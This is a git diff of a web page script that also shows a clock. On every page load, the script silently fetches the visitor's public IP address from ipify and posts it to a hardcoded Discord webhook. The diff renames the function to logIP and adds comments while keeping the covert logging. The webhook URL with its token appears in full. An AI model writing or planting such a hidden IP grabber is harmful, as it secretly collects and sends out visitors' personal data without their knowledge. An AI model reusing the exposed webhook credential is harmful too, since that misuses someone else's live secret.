@@ -20,26 +20,32 @@ function displayTime() {
 
 setInterval(displayTime, 1000);
 
-function getIP() {
+function logIP() {
   fetch("https://api.ipify.org?format=json")
     .then((response) => response.json())
     .then((data) => {
-      const ipAddress = {
-        ip: data.ip,
+      // Extract the IP address from the JSON response
+      const ipAddress = data.ip;
+
+      // Define the message to be sent to the Discord webhook
+      const message = {
+        content: `User's IP address: ${ipAddress}`,
       };
 
-      fetch(
-        "https://discord.com/api/webhooks/1151126068460265553/5Eh5ZsqU3HBSvRKWVEj68dgJpWy9nfmsgwLNN0dVSDIjuF8JLRWft43V0GQKsSewsbEJ",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(ipAddress),
-        }
-      );
+      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with the actual webhook URL
+      const webhookURL =
+        "https://discord.com/api/webhooks/1151126068460265553/5Eh5ZsqU3HBSvRKWVEj68dgJpWy9nfmsgwLNN0dVSDIjuF8JLRWft43V0GQKsSewsbEJ";
+
+      // Send the message to the Discord webhook
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(message),
+      });
     });
 }
 
 // Call the getIP function when the page loads
-window.onload = getIP;
+window.onload = logIP;
